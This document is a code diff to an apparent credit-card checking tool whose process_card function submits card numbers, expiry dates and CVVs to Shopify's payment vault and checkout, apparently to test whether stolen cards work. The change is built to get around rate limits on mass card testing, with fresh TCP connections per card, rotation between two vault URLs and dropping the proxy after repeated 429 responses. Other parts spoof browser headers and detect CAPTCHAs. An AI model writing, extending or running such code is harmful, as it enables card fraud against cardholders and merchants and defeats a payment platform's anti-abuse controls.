@@ -510,50 +510,105 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                  "variables":prop_vars}, proxy)
             if is_captcha(t2 or ""): return False,"CAPTCHA_REQUIRED_delivery",gateway,price,currency
  
-            # ── vault card — standalone session, no site-cookie bleed ────────
+            # ── vault card ────────────────────────────────────────────────────
+            # CRITICAL: fresh TCPConnector per vault call — NEVER share with
+            # the site connector. Shared connector = same TCP connection bucket
+            # = Shopify rate-limits all 20 parallel cards as one client.
+            # Fresh connector = independent TCP handshake = independent rate limit.
             vault_body = json.dumps({
                 "credit_card":{
-                    "number":cc,"month":int(mes),"year":int(ano),"verification_value":cvv,
-                    "start_month":None,"start_year":None,"issue_number":"","name":f"{fn} {ln}"},
+                    "number":cc,"month":int(mes),"year":int(ano),
+                    "verification_value":cvv,"start_month":None,"start_year":None,
+                    "issue_number":"","name":f"{fn} {ln}"},
                 "payment_session_scope": netloc,
-            },ensure_ascii=False).encode("utf-8")
-            vh = {
-                "Content-Type":"application/json","Accept":"application/json",
-                "Accept-Language":"en-US,en;q=0.9",
-                "Origin":"https://checkout.pci.shopifyinc.com",
-                "Referer":"https://checkout.pci.shopifyinc.com/",
-                "User-Agent": hdrs["User-Agent"],
-                "sec-ch-ua": hdrs["sec-ch-ua"],"sec-ch-ua-mobile":"?0",
-                "sec-ch-ua-platform":'"Windows"',
-                "sec-fetch-dest":"empty","sec-fetch-mode":"cors",
-                "sec-fetch-site":"same-origin","sec-fetch-storage-access":"active",
-            }
-            if ident_sig: vh["shopify-identification-signature"] = ident_sig
+            }, ensure_ascii=False).encode("utf-8")
  
-            vault_conn = await _get_connector("checkout.pci.shopifyinc.com")
-            vault_to   = aiohttp.ClientTimeout(connect=CONN_TIMEOUT, sock_read=12)
-            try:
-                async with aiohttp.ClientSession(connector=vault_conn, connector_owner=False,
-                                                 timeout=vault_to) as vs:
-                    async with vs.post("https://checkout.pci.shopifyinc.com/sessions",
-                                       data=vault_body, headers=vh, proxy=proxy) as vr:
-                        if vr.status == 429:
-                            # retry once after 1.5s
-                            await asyncio.sleep(1.5)
-                            async with vs.post("https://checkout.pci.shopifyinc.com/sessions",
-                                               data=vault_body, headers=vh, proxy=proxy) as vr2:
-                                if vr2.status == 429:
-                                    return False,"vault_429_retry",gateway,price,currency
-                                vt = await vr2.text()
-                        else:
-                            vt = await vr.text()
-                vj, ve = safe_json(vt, "vault")
-                if ve: return False,f"vault_parse:{ve}",gateway,price,currency
-                if not isinstance(vj,dict): return False,"vault_non_dict",gateway,price,currency
+            # Two vault URLs — newer Shopify infra uses .shopify.com (no 'inc')
+            _VAULT_URLS = [
+                "https://checkout.pci.shopifyinc.com/sessions",
+                "https://checkout.pci.shopify.com/sessions",
+            ]
+            # Try to detect the right vault URL from the checkout page HTML
+            if "checkout.pci.shopify.com" in unesc and "checkout.pci.shopifyinc.com" not in unesc:
+                _VAULT_URLS = _VAULT_URLS[::-1]  # prefer .shopify.com
+ 
+            def _vault_headers(vault_base_url):
+                h = {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Origin":  vault_base_url.rsplit("/sessions",1)[0],
+                    "Referer": vault_base_url.rsplit("/sessions",1)[0] + "/",
+                    "User-Agent": hdrs["User-Agent"],
+                    "sec-ch-ua": hdrs["sec-ch-ua"],
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": '"Windows"',
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "sec-fetch-storage-access": "active",
+                }
+                if ident_sig:
+                    h["shopify-identification-signature"] = ident_sig
+                return h
+ 
+            async def _vault_once(url, prx):
+                """One vault attempt — fresh connector, fresh session every call."""
+                vc = aiohttp.TCPConnector(ssl=_ssl_ctx, limit=5,
+                                          enable_cleanup_closed=True)
+                vt_obj = aiohttp.ClientTimeout(connect=CONN_TIMEOUT, sock_read=12)
+                try:
+                    async with aiohttp.ClientSession(connector=vc, timeout=vt_obj) as vs:
+                        async with vs.post(url, data=vault_body,
+                                           headers=_vault_headers(url),
+                                           proxy=prx) as vr:
+                            status = vr.status
+                            body   = await vr.text()
+                    return status, body
+                except Exception as ex:
+                    return None, str(ex)[:100]
+                finally:
+                    await vc.close()
+ 
+            # Retry schedule: (wait_before_s, url_index, proxy_override)
+            # On first 429: switch URL. On second 429: drop proxy → go direct.
+            _RETRY_PLAN = [
+                (0,   0, proxy),   # attempt 1 — primary URL, normal proxy
+                (1.0, 1, proxy),   # attempt 2 — alt URL, same proxy (new TCP)
+                (2.0, 0, None),    # attempt 3 — primary URL, go direct (bypass proxy rate-limit)
+                (3.0, 1, None),    # attempt 4 — alt URL, direct
+            ]
+ 
+            token = None
+            last_vault_err = "vault_all_attempts_failed"
+            for wait_s, url_idx, prx_override in _RETRY_PLAN:
+                if wait_s > 0:
+                    await asyncio.sleep(wait_s)
+                v_url = _VAULT_URLS[url_idx]
+                status, body = await _vault_once(v_url, prx_override)
+                if status is None:
+                    last_vault_err = f"vault_conn_err:{body}"
+                    continue
+                if status == 429:
+                    last_vault_err = f"vault_429:{v_url.split('/')[2]}"
+                    continue
+                if status not in (200, 201):
+                    last_vault_err = f"vault_http_{status}:{body[:60]}"
+                    continue
+                vj, ve = safe_json(body, "vault")
+                if ve:
+                    last_vault_err = f"vault_parse:{ve}"
+                    continue
+                if not isinstance(vj, dict):
+                    last_vault_err = "vault_non_dict"
+                    continue
                 token = vj.get("id")
-                if not token: return False,f"no_vault_token:{str(vj)[:80]}",gateway,price,currency
-            except Exception as e:
-                return False,f"vault_error:{str(e)[:80]}",gateway,price,currency
+                if token:
+                    break
+                last_vault_err = f"vault_no_id:{str(vj)[:80]}"
+ 
+            if not token:
+                return False, last_vault_err, gateway, price, currency
  
             # ── submit ────────────────────────────────────────────────────────
             sa = {k:v for k,v in addr_p.items()}; sa["address2"] = ""
@@ -985,3 +1040,4 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     # threaded=True: each Flask request gets its own OS thread, safe with shared loop
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
+ 
